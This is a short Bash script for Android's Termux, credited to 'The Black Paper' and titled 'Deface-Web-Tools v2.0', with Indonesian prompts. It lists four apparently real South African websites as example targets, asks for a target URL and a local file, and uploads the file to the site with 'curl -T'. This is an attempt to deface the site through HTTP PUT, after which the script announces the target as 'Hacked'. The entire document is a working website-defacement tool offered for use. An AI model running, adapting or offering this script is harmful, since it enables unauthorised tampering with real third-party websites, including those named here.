green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"
pkg install figlet -y
pkg install curl -y
echo  $green
echo "blackpaper.............";
sleep 0.1;
clear
echo
echo
echo
echo
echo
figlet -f future "The Black Paper"
echo ------------------------------
echo Team:The Black Paper
echo Creator:7870a
echo github:https://github.com/7870a
echo Deface-Web-Tools v2.0
echo ------------------------------
read -p "Nama Samaran:"  ta
clear
echo $green
echo Simpan SC Di Memory Internal Di Luar Folder
echo Contoh Target:
echo $red
echo "http://colourfactory.co.za"          
echo $cyan 
echo "http://chillibitez.co.za"
echo $red
echo "http://centraltech.co.za"
echo $cyan
echo "http://windmillsandporcupines.co.za"
echo $green
echo eksekusi target
read -p "Target=>"  target
clear
echo Loading
clear
echo Simpan SC Di Memory Internal Di Luar Folder
echo $red
read -p "Nama Script=>"  script
echo $cyan
echo loading..
curl -T /storage/emulated/0/$script $target
echo $red
echo [$target~Hacked]
echo $green
echo terimakasih $ta telah menggunakan tools ini
